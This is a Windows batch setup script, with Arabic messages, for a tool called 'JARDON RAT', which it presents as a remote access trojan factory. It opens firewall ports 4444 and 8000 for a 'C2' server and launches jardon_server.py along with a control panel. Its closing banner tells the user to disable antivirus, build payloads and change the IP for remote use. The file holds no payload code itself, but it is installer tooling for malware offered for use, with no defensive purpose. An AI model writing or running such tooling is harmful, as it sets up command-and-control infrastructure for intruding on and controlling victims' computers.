@echo off
chcp 65001 >nul
title JARDON RAT v1.0 - Ultimate RAT Factory
color 0A
mode con: cols=100 lines=30

echo.
echo ╔══════════════════════════════════════════════════╗
echo ║             🐀 JARDON RAT v1.0 🐀               ║
echo ║           Ultimate RAT Factory                   ║
echo ╚══════════════════════════════════════════════════╝
echo.
echo [1] التحقق من متطلبات النظام...
echo.

:: التحقق من Python
python --version >nul 2>nul
if errorlevel 1 (
    echo ❌ Python غير مثبت على النظام!
    echo.
    echo 📥 يرجى تثبيت Python 3 من:
    echo    https://www.python.org/downloads/
    echo.
    echo ✅ أثناء التثبيت، تأكد من تفعيل:
    echo    - Add Python to PATH
    echo    - Install pip
    echo.
    pause
    exit /b 1
)

echo ✅ Python مثبت: 
python --version

:: التحقق من pip
pip --version >nul 2>nul
if errorlevel 1 (
    echo ❌ pip غير مثبت!
    echo.
    echo 📥 جاري تثبيت pip تلقائياً...
    curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
    python get-pip.py
    del get-pip.py
)

echo ✅ pip مثبت
echo.

echo [2] تثبيت المكتبات المطلوبة...
echo.
pip install --upgrade pip >nul 2>nul
echo ✅ pip محدّث

:: تثبيت المكتبات (إذا لم تكن مثبتة)
pip list | findstr "requests" >nul
if errorlevel 1 (
    echo 📦 جاري تثبيت مكتبات Python...
    pip install requests >nul 2>nul
    echo ✅ requests مثبتة
)

echo.
echo [3] إنشاء هيكل الملفات...
echo.

:: إنشاء المجلدات
if not exist "builds" mkdir builds
if not exist "logs" mkdir logs
if not exist "payloads" mkdir payloads

echo ✅ مجلد builds/ جاهز
echo ✅ مجلد logs/ جاهز
echo ✅ مجلد payloads/ جاهز

echo.
echo [4] نسخ ملفات النظام...
echo.

:: التحقق من وجود الملفات
if not exist "index.html" (
    echo ❌ ملف index.html غير موجود!
    echo 📥 يرجى التأكد من وجود جميع الملفات:
    echo   1. index.html
    echo   2. jardon_server.py
    echo   3. setup.bat
    echo.
    pause
    exit /b 1
)

if not exist "jardon_server.py" (
    echo ❌ ملف jardon_server.py غير موجود!
    pause
    exit /b 1
)

echo ✅ جميع الملفات موجودة
echo.

echo [5] فحص المنافذ...
echo.

:: فحص إذا المنافذ مشغولة
netstat -ano | findstr ":4444" >nul
if not errorlevel 1 (
    echo ⚠️  المنفذ 4444 مشغول!
    echo    قد يكون هناك تطبيق آخر يستخدمه
    echo    جاري محاولة استخدام منفذ بديل...
    set /a ALT_PORT=5555
    echo    استخدام المنفذ %ALT_PORT% بدلاً من ذلك
)

netstat -ano | findstr ":8000" >nul
if not errorlevel 1 (
    echo ⚠️  المنفذ 8000 مشغول!
    echo    جاري محاولة استخدام منفذ بديل...
    set /a WEB_PORT=8001
    echo    استخدام المنفذ %WEB_PORT% بدلاً من ذلك
)

echo.
echo [6] إعداد جدار الحماية...
echo.

:: فتح المنافذ في جدار الحماية
netsh advfirewall firewall show rule name="JARDON C2" >nul 2>nul
if errorlevel 1 (
    echo 🔓 فتح المنافذ في جدار الحماية...
    netsh advfirewall firewall add rule name="JARDON C2" dir=in action=allow protocol=TCP localport=4444 >nul
    netsh advfirewall firewall add rule name="JARDON Web" dir=in action=allow protocol=TCP localport=8000 >nul
    echo ✅ تم فتح المنافذ
) else (
    echo ✅ المنافذ مفتوحة مسبقاً
)

echo.
echo [7] إنشاء اختصار سريع...
echo.

:: إنشاء ملف تشغيل سريع
echo @echo off > start_jardon.bat
echo chcp 65001 >> start_jardon.bat
echo title JARDON RAT - Running... >> start_jardon.bat
echo color 0A >> start_jardon.bat
echo echo. >> start_jardon.bat
echo echo 🚀 جاري تشغيل JARDON RAT v1.0... >> start_jardon.bat
echo echo. >> start_jardon.bat
echo start python jardon_server.py >> start_jardon.bat
echo timeout /t 3 /nobreak ^>nul >> start_jardon.bat
echo start http://localhost:8000 >> start_jardon.bat
echo echo. >> start_jardon.bat
echo echo ✅ النظام يعمل الآن! >> start_jardon.bat
echo echo. >> start_jardon.bat
echo echo 🌐 افتح المتصفح على: http://localhost:8000 >> start_jardon.bat
echo echo 🐀 أو افتح index.html مباشرة >> start_jardon.bat
echo echo. >> start_jardon.bat
echo pause >> start_jardon.bat

echo ✅ تم إنشاء start_jardon.bat
echo.

echo [8] الإعدادات النهائية...
echo.

:: إنشاء ملف config
echo { > config.json
echo   "version": "1.0", >> config.json
echo   "c2_port": 4444, >> config.json
echo   "web_port": 8000, >> config.json
echo   "first_run": "%date% %time%", >> config.json
echo   "auto_update": true >> config.json
echo } >> config.json

echo ✅ تم إنشاء config.json
echo.

echo ╔══════════════════════════════════════════════════╗
echo ║                ✅ الإعداد اكتمل!                 ║
echo ╠══════════════════════════════════════════════════╣
echo ║                                                  ║
echo ║ 📂 الملفات التي تم إنشاؤها:                     ║
echo ║   • index.html      - الواجهة الرئيسية          ║
echo ║   • jardon_server.py- خادم C2                   ║
echo ║   • start_jardon.bat- ملف التشغيل السريع        ║
echo ║   • config.json     - إعدادات النظام            ║
echo ║   • builds/         - مجلد الحمولات             ║
echo ║                                                  ║
echo ║ 🚀 طريقة الاستخدام:                             ║
echo ║   1. اضغط مزدوج على start_jardon.bat            ║
echo ║   2. افتح index.html في المتصفح                 ║
echo ║   3. ابدأ ببناء حمولاتك                         ║
echo ║                                                  ║
echo ║ 🌐 أو افتح مباشرة:                              ║
echo ║   • http://localhost:8000  - لوحة التحكم        ║
echo ║   • index.html             - الواجهة الرئيسية   ║
echo ║                                                  ║
echo ║ ⚠️  ملاحظات مهمة:                               ║
echo ║   • تأكد من إيقاف مضاد الفيروسات مؤقتاً         ║
echo ║   • النظام يعمل على localhost فقط               ║
echo ║   • للاستخدام عن بعد: غير الـ IP في الإعدادات   ║
echo ║                                                  ║
echo ║ 🐀 JARDON RAT - صنع فئران إلكترونية بضغطة زر!  ║
echo ╚══════════════════════════════════════════════════╝
echo.

echo اضغط Enter لبدء التشغيل الآن، أو Ctrl+C للإلغاء...
pause >nul

:: بدء التشغيل
start_jardon.bat